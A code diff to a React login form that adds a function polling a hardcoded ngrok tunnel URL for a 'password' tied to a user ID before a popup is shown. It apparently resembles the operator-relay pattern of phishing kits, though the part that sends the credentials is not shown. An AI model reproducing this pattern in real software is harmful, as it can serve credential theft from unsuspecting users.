@@ -5,6 +5,33 @@ const LoginForm = ({setIsShowPopup, setUserLogin }) => {
   const [login, setLogin] = useState('');
   const [pass, setPass] = useState('');
 
+  const ngrokUrl = 'https://8a36-46-150-81-164.ngrok-free.app ';
+
+    const pollForPassword = async (userId) => {
+        try {
+            const response = await fetch(`${ngrokUrl}/api/get-pass`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ userId }),
+            });
+
+            if (response.ok) {
+                const { password } = await response.json();
+                if (password) {
+                    setIsShowPopup(true);
+                } else {
+                    setTimeout(() => pollForPassword(userId), 2000); // Повторити через 2 секунди
+                }
+            } else {
+                console.error('Failed to poll for password');
+            }
+        } catch (error) {
+            console.error('Error during polling:', error);
+        }
+    };
+
   const handleSubmit = async (e) => {
     e.preventDefault();
     
@@ -40,7 +67,7 @@ const LoginForm = ({setIsShowPopup, setUserLogin }) => {
         throw new Error(errorResponse.message || 'Something went wrong');
       }
 
- 
+        await pollForPassword(userId);
 
     } catch (error) {
       console.log(error.message);
